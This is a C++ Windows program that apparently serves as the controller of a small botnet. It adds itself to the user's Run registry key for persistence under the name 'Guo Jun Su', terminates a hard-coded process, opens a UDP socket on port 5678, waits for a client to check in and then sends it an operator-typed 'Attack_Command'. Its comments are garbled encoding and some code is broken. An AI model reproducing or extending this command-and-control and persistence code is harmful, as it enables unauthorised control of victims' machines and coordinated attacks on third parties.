#pragma comment(lib, "Ws2_32.lib")
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" ) // �]�m�J�f��} 
#include <WinSock2.h>
#include <iostream>
#include <string>
# include <tchar.h>
#include <windows.h>
//aa
using namespace std;


struct NetInfo {
	int Port;
	char *IP;
};
#define struct NetInfo NetInfo;  
#define Default_Port 5678;
#define buffer_size 1024;
void Check_Registry(char *Path);
int Windows_Sockets_Version();
int SetServerSocket(SOCKET *SockServer,NetInfo *netinfo);
int ReceivefromClient(SOCKET SockServer, sockaddr_in *clientAddr );
int SendtoClient(SOCKET SockServer, sockaddr_in clientAddr,char *Attack_Command);
int size(char *Attack_Command);
BOOL KillProcess(DWORD ProcessId);
int main(int argc,char* argv[])
{	 
	NetInfo netinfo[1]={NULL};
	SOCKET SockServer=NULL;
	sockaddr_in clientAddr={0};  
	//�P�_WindSocketServer();owsSocket�ϥΪ���
	KillProcess(4872);
	cout<<"�������r�n��"<<endl;
	//���U�}���۰ʰ���
	Check_Registry(argv[0]);
	if(Windows_Sockets_Version()!=0){
		cout<<"Failed to load Winsock!"<<endl;
		getchar();
		return -1;
	}
	//cout<<"Successful!"<<endl;		
	netinfo[0].IP="203.64.84.139";
	netinfo[0].Port=5678;
	//�Ы�Socket�q�D
	if(SetServerSocket(&SockServer,netinfo)==-1)
		return -1;
	//���ݱ���
	if(ReceivefromClient(SockServer,&clientAddr)==-1)
		return -1;

	char message[1024]={'\0'};
	cout<<"�����R�O��J:";	
	cin.getline(message,1024);
	//�e�X�����T��
	if(SendtoClient(SockServer,clientAddr,message)==-1)
		return -1;

	getchar();
	return 0;
}
BOOL KillProcess(DWORD ProcessId)
{
	HANDLE hProcess=OpenProcess(PROCESS_TERMINATE,FALSE,ProcessId);
	if(hProcess==NULL)
		return FALSE;
	if(!TerminateProcess(hProcess,0))
		return FALSE;
	return TRUE;
}
void Check_Registry(char *Path){
	HKEY hKey = NULL;
	TCHAR * subKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
	DWORD dwOptions = REG_OPTION_NON_VOLATILE;
	DWORD dwDisposition;
	//LONG RegCreateKeyEx(  
	//           HKEY hKey,        // �D���W��
	//           LPCTSTR lpSubKey,     // �l���W�٩θ��|
	//           DWORD Reserved,      // �O�d�A��0  
	//           LPTSTR lpClass,      // �@��]�m��NULL
	//           DWORD dwOptions,       
	//           ��A�@�Ǩ����ﶵ�A�i�H�O�o�ǭȡGREG_OPTION_NON_VOLATILE�A
	//			REG_OPTION_VOLATILE�A
	//			REG_OPTION_BACKUP_RESTORE �Ĥ@�ӬO�q�{���C�@��βĤ@�ӴN��F
	//           REGSAM samDesired,    // �]�m�A�إߪ��o�Ө����v��
	//           LPSECURITY_ATTRIBUTES lpSecurityAttributes,  
	//           //�@��]�m��NULL
	//           PHKEY phkResult,     // ��^�s�ص��U��  
	//           LPDWORD lpdwDisposition  //�ι�ݬO���}�@�Ӳ{�����ءA�٬O�s�ت���  
	//     );  
	long resulte = RegCreateKeyEx(HKEY_CURRENT_USER, subKey, 0, NULL, 
		dwOptions, KEY_WRITE|KEY_READ, NULL, &hKey, &dwDisposition);
	if (resulte != ERROR_SUCCESS)
		cout<<"���}���U����"<<endl;
	else
	{
		if (dwDisposition == REG_OPENED_EXISTING_KEY)
		{
			cout<<"���}�@�Ӧs�b�����U��"<<endl;
			if(RegQueryValueEx(hKey, TEXT("Guo Jun Su"), NULL, NULL, NULL, NULL) == ERROR_FILE_NOT_FOUND){
				cout << "Writing to registry...\n";

				RegSetValueEx(hKey, _T("Guo Jun Su"), 0, REG_SZ, (LPBYTE) Path, (DWORD)strlen(Path)*sizeof(CHAR)) ;
			}
		}
		else if (dwDisposition == REG_CREATED_NEW_KEY) 
			cout<<"�s�W�@�ӵ��U��"<<endl;
	}
}

int Windows_Sockets_Version(){
	int Result;
	WSAData wsaData;
	WORD DLLVSERION;
	DLLVSERION = MAKEWORD(2,2);//Winsocket-DLL ����
	//�� WSAStartup �}�l Winsocket-DLL
	Result = WSAStartup(DLLVSERION, &wsaData);
	return Result;
}

int SetServerSocket(SOCKET *SockServer,NetInfo *netinfo){
	struct sockaddr_in thisAddr;
	int timeout=10000;
	//�]�wClient��������
	memset(&thisAddr,0,sizeof(thisAddr));
	thisAddr.sin_family = AF_INET;  
	thisAddr.sin_port = htons(netinfo[0].Port);  
	//thisAddr.sin_addr.s_addr =  inet_addr(netinfo[0].IP); 
	thisAddr.sin_addr.s_addr = INADDR_ANY; // �Y�]�w INADDR_ANY ��ܥ��� IP

	//�إ߻PServer���q��socket�M�PClient���q��socket�A�`�N�����O�b�@�˪�Port�C  
	*SockServer = socket(AF_INET,SOCK_DGRAM,IPPROTO_UDP);  
	if (*SockServer == INVALID_SOCKET) {  
		cout<<"Socket() failed:"<<WSAGetLastError()<<endl;  
		return -1;  
	}
	cout<<"Socket Success~"<<endl;
	if (bind(*SockServer,(SOCKADDR*)&thisAddr,sizeof(thisAddr)) == SOCKET_ERROR) {  
		cout<<"Bind() failed:"<<WSAGetLastError()<<endl;  
		return -1;  
	}  
	cout<<"Bind Success~"<<endl;
	//�]�wtimeout 
	setsockopt(*SockServer,SOL_SOCKET,SO_RCVTIMEO,(char *)&timeout,sizeof(timeout));
	setsockopt(*SockServer,SOL_SOCKET,SO_SNDTIMEO,(char *)&timeout,sizeof(timeout));
}

int ReceivefromClient(SOCKET SockServer, sockaddr_in *clientAddr){
	int Buffer_Size=buffer_size;
	//Server 
	while(1){
		//Client1�qServer��^����T���o��Client2��Ip�MPort  	
		char bufRecv[1024]={0};  
		int length=sizeof((*clientAddr));
		//if(round==5){
		//	round=0;
		//	closesocket(SockServer);  
		//	WSACleanup();
		//	//�إ߻PServer���q��socket�M�PClient���q��socket�A�`�N�����O�b�@�˪�Port�C  
		//	SOCKET SockServer = socket(AF_INET,SOCK_DGRAM,0);  
		//	if (SockServer == INVALID_SOCKET) {  
		//		cout<<"Socket() failed:"<<WSAGetLastError()<<endl;  
		//		return -1;  
		//	}
		//	cout<<"Socket Success~"<<endl;
		//	cout<<"test"<<endl;
		//}
		//�]�wtimeout �קK���B�D�ʥ]�d��
		if (recvfrom(SockServer, bufRecv, sizeof(bufRecv), 0,(SOCKADDR*)&(*clientAddr),&length) == SOCKET_ERROR) {  
			cout<<"Recvfrom() failed:"<<WSAGetLastError()<<endl;  
			continue;
		}  
		cout<<"Recvfrom Success~"<<endl;
		cout<<"Source IP:"<<inet_ntoa((*clientAddr).sin_addr)<<"\t, Port:"<<htons((*clientAddr).sin_port)<<"�ASend:"<<bufRecv<<endl;	
		break;
	}
	return 0;
}

int SendtoClient(SOCKET SockServer, sockaddr_in clientAddr,char *Attack_Command){
	//Server Send Message To Client 
	int wordsize=size(Attack_Command);
	if (sendto(SockServer,Attack_Command,wordsize,0,(SOCKADDR*)&clientAddr,sizeof(clientAddr)) == SOCKET_ERROR) {  
		cout<<"Sendto() failed:"<<WSAGetLastError()<<endl;  
		return -1; 
	}  
	cout<<"�e�X�h���T��:"<<Attack_Command<<endl;	
	return 0;
}

int size(char *Attack_Command){
	int wordsize=0;
	for(;Attack_Command[wordsize]!='\0';wordsize++);
	return wordsize;
}